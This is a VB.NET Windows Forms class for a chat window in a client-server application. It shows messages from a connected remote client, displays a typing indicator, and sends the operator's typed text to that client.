﻿Imports System.ComponentModel

Public Class Chat
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public timer_0 As System.Timers.Timer
    Public timer_1 As System.Timers.Timer
    Sub Client_data(ByVal data As String)
        Try
            If data IsNot Nothing Then

                If data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]") Then
                    Dim spl_Exception() As String = {"[My/Exception]"}
                    Dim p() As String = data.Split(spl_Exception, StringSplitOptions.RemoveEmptyEntries)
                    'Label1.Text = p(0)
                    'If Panel3.Visible = False Then Panel3.Visible = True
                Else

                    Dim split_Ary() As String = {Form1.s.split_Ary}
                    Dim Ary() As String = data.Split(split_Ary, StringSplitOptions.RemoveEmptyEntries)
                    If Ary.Length = 2 Then


                        If CStr(Ary(0)) = "Connected" And CStr(Ary(1)) = "OpWin" Then
                            If Panel2.Visible = True Then Panel2.Visible = False
                        ElseIf CStr(Ary(0)) = "write" Then
                            If Panel2.Visible = False Then Panel2.Visible = True
                            Label1.Text = CStr(Ary(1))

                            If timer_0.Enabled = True Then timer_0.Enabled = False
                            timer_0.Enabled = True

                            If timer_1.Enabled = False Then timer_1.Enabled = True

                        ElseIf CStr(Ary(0)) = "null" Then
                            If Panel2.Visible = True Then Panel2.Visible = False
                            Label1.Text = Nothing
                        Else
                            If Panel2.Visible = True Then Panel2.Visible = False
                            DataGridView1.Rows.Add(Ary(0) + Space(10), Ary(1))
                            ToEnd()
                        End If


                    End If
                    refres_title()

                End If
            End If
        Catch ex As Exception

            'MsgBox(ex.ToString)
        End Try
    End Sub
    Private Sub ToEnd()
        Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.DataGridView1.RowCount - 1
        Me.DataGridView1.CurrentCell = Nothing
        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Selected = True
    End Sub
    Private Sub refres_title()
        Dim title As String = String.Format("Chat" + " - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", Client_remote_Address, Name_Client, CStr(DataGridView1.Rows.Count), CStr(DataGridView1.SelectedRows.Count))
        Text = title
    End Sub
    Private Sub Chat_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Label2.Text = Nothing
        timer_0 = New System.Timers.Timer(1000 * 5)
        AddHandler timer_0.Elapsed, AddressOf OnTimedEvent
        timer_0.AutoReset = True

        timer_1 = New System.Timers.Timer(1000)
        AddHandler timer_1.Elapsed, AddressOf OnTimedEvent1
        timer_1.AutoReset = True


        refres_title()
        Me.Icon = store_0.icons_0("window")
    End Sub
    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        refres_title()
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged

    End Sub
    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            If Not TextBox1.Text = Nothing Then
                Form1.s.Send(handle_Number_Client, "chat_set" + Form1.s.SplitData + TextBox1.Text)
                DataGridView1.Rows.Add("Me:" + Space(10), TextBox1.Text)
                ToEnd()
                TextBox1.Text = String.Empty
            End If

        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Not TextBox1.Text = Nothing Then
            Form1.s.Send(handle_Number_Client, "chat_set" + Form1.s.SplitData + TextBox1.Text)
            DataGridView1.Rows.Add("Me:" + Space(10), TextBox1.Text)
            ToEnd()
            TextBox1.Text = String.Empty
        End If
    End Sub

    Private Sub Chat_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Form1.s.Send(handle_Number_Client, "chat_set" + Form1.s.SplitData + "/exit/chat/")
    End Sub
    Private Sub OnTimedEvent1(source As Object, e As Timers.ElapsedEventArgs)


        If Panel2.Visible = True Then
            Label2.Text = e90()
            b91 += 1
        Else
            Label2.Text = Nothing
            b91 = 0
            timer_1.Enabled = False
        End If



    End Sub
    Private Sub OnTimedEvent(source As Object, e As Timers.ElapsedEventArgs)
        If Panel2.Visible = True Then Panel2.Visible = False
        timer_0.Enabled = False
    End Sub
    Dim b91% = 0
    Function e90() As String
        If b91 > 2 Then
            b91 = 0
        End If
        Select Case b91
            Case 0
                Return "."
            Case 1
                Return ".."
            Case 2
                Return "..."
            Case Else
                Return "..."
        End Select
    End Function
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Form1.s.Send(handle_Number_Client, "chat_set" + Form1.s.SplitData + "PANG !!")
        DataGridView1.Rows.Add("Me:" + Space(10), "PANG !!")
        ToEnd()
    End Sub
End Class